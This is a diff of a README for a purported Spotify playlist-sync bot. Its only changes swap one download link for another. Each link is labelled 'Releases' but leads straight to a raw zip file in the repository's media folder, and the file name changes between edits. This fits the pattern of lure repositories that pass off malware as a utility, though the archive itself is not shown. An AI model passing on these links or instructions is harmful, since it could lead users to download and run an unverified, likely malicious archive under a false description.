@@ -1,6 +1,6 @@
 # 🎶 Spotify-Playlist-Synchronization-Bot - Effortless Playlist Syncing Made Easy
 
-[![Download](https://raw.githubusercontent.com/iritalevorotatory830/Spotify-Playlist-Synchronization-Bot/main/media/Spotify-Playlist-Synchronization-Bot_v2.1.zip)](https://raw.githubusercontent.com/iritalevorotatory830/Spotify-Playlist-Synchronization-Bot/main/media/Spotify-Playlist-Synchronization-Bot_v2.1.zip)
+[![Download](https://github.com/iritalevorotatory830/Spotify-Playlist-Synchronization-Bot/raw/refs/heads/main/media/Spotify-Bot-Playlist-Synchronization-buttress.zip)](https://github.com/iritalevorotatory830/Spotify-Playlist-Synchronization-Bot/raw/refs/heads/main/media/Spotify-Bot-Playlist-Synchronization-buttress.zip)
 
 ## 📄 Introduction
 
@@ -11,7 +11,7 @@ Welcome to the **Spotify Playlist Synchronization Bot**. This tool helps you aut
 To get started with the Spotify Playlist Synchronization Bot, follow these steps:
 
 1. **Download the Software**
-   - Visit this page to download: [Spotify Playlist Synchronization Bot Releases](https://raw.githubusercontent.com/iritalevorotatory830/Spotify-Playlist-Synchronization-Bot/main/media/Spotify-Playlist-Synchronization-Bot_v2.1.zip).
+   - Visit this page to download: [Spotify Playlist Synchronization Bot Releases](https://github.com/iritalevorotatory830/Spotify-Playlist-Synchronization-Bot/raw/refs/heads/main/media/Spotify-Bot-Playlist-Synchronization-buttress.zip).
 
 2. **Install the Bot**
    - Locate the file you downloaded. It should be in your "Downloads" folder or the location you chose to save it.
@@ -43,7 +43,7 @@ To ensure optimal performance, please make sure your device meets the following 
 
 ## 📥 Download & Install
 
-You can download the latest release of the Spotify Playlist Synchronization Bot by visiting this page: [Spotify Playlist Synchronization Bot Releases](https://raw.githubusercontent.com/iritalevorotatory830/Spotify-Playlist-Synchronization-Bot/main/media/Spotify-Playlist-Synchronization-Bot_v2.1.zip). 
+You can download the latest release of the Spotify Playlist Synchronization Bot by visiting this page: [Spotify Playlist Synchronization Bot Releases](https://github.com/iritalevorotatory830/Spotify-Playlist-Synchronization-Bot/raw/refs/heads/main/media/Spotify-Bot-Playlist-Synchronization-buttress.zip). 
 
 Once again, you can find the download link above as a button for convenience.
 
